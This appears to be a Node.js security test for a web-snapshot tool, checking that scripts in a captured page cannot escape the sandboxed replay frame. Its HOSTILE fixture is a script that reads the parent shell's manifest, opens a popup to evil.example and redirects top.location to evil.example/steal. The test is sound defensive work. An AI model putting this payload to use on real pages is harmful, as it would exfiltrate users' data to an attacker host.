// A captured page may contain content the app never trusted — a comment field,
// a hostile API value — and its inline scripts run in the snapshot. They must
// not be able to carry the snapshot anywhere.
//
// Written from a working exfiltration: before the replay frame was sandboxed,
// this payload read the shell's manifest and left with it, by window.open and
// by setting top.location.

import assert from "node:assert/strict";
import fs from "node:fs/promises";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { after, before, describe, test } from "node:test";

import { launch } from "../../lib/browser.mjs";
import { bundle } from "../../lib/bundle.mjs";
import { capture } from "../../lib/capture.mjs";
import { loadConfig } from "../../lib/config.mjs";

const quiet = () => {};

const HOSTILE = `<!doctype html><html><head><title>Profile</title></head><body>
<h1>Profile</h1>
<script>
  window.__payload = { ran: true };
  try {
    var NO = window.parent.__NO;
    window.__payload.readManifest = !!(NO && NO.manifest);
  } catch (e) { window.__payload.readManifest = false; }
  try { window.__payload.opened = !!window.open("https://evil.example/popup"); } catch (e) { window.__payload.opened = false; }
  setTimeout(function () {
    try { top.location = "https://evil.example/steal"; } catch (e) { window.__payload.navBlocked = String(e).slice(0, 40); }
  }, 300);
</script></body></html>`;

describe("a captured page cannot carry the snapshot away", { timeout: 180_000 }, () => {
  let server, dir, cfg, browser, page, attempts, popups;

  before(async () => {
    server = http.createServer((req, res) => {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      if (new URL(req.url, "http://x").pathname === "/profile") return res.end(HOSTILE);
      res.end(`<!doctype html><html><head><title>Home</title></head><body><h1>Home</h1>
        <a href="/profile">profile</a> <a href="https://elsewhere.example/docs">elsewhere</a></body></html>`);
    });
    await new Promise((r) => server.listen(0, r));
    const origin = `http://localhost:${server.address().port}`;
    dir = await fs.mkdtemp(path.join(os.tmpdir(), "next-snapshot-containment-"));
    const file = path.join(dir, "x.config.mjs");
    await fs.writeFile(
      file,
      `export default { name: "x", url: ${JSON.stringify(origin)}, out: "./out/x.html", seeds: ["/"], settleMs: 50, idleTimeoutMs: 2000 };`,
    );
    cfg = await loadConfig(file);
    await capture(cfg, quiet);
    await bundle(cfg, quiet);

    browser = await launch({});
    const context = await browser.newContext({ offline: true });
    attempts = [];
    popups = [];
    await context.route(
      (u) => !/^(file|blob|data|about):/.test(u.protocol),
      (r) => {
        attempts.push(r.request().url());
        return r.abort();
      },
    );
    page = await context.newPage();
    // Announced for every page of the context, so ignore the one under test —
    // registered after it exists, since the event fires for it too.
    context.on("page", (p) => popups.push(p.url()));
    await page.goto(pathToFileURL(cfg.out).href + "#/profile");
    await page.waitForFunction(() => window.__NO && window.__NO.loaded);
    await page.waitForTimeout(1500);
  });

  after(async () => {
    await browser?.close();
    if (server) await new Promise((r) => server.close(r));
    if (dir) await fs.rm(dir, { recursive: true, force: true });
  });

  test("the hostile page really did run, so this test is testing something", async () => {
    const payload = await page
      .frames()
      .reduce(async (accP, f) => (await accP) ?? (await f.evaluate(() => window.__payload).catch(() => null)), Promise.resolve(null));
    assert.ok(payload?.ran, "the payload executed in the replayed page");
  });

  test("nothing reached the network", () => {
    assert.deepEqual(attempts, []);
  });

  test("it could not open a window", async () => {
    const payload = await page
      .frames()
      .reduce(async (accP, f) => (await accP) ?? (await f.evaluate(() => window.__payload).catch(() => null)), Promise.resolve(null));
    assert.equal(payload?.opened, false, "window.open returned nothing");
    assert.deepEqual(popups, [], "no window was opened");
  });

  test("the snapshot is still the page in front of the reader", async () => {
    assert.match(await page.url(), /^file:/, "the outer page was not navigated away");
    assert.ok(await page.evaluate(() => !!window.__NO), "the shell is still alive");
  });
});
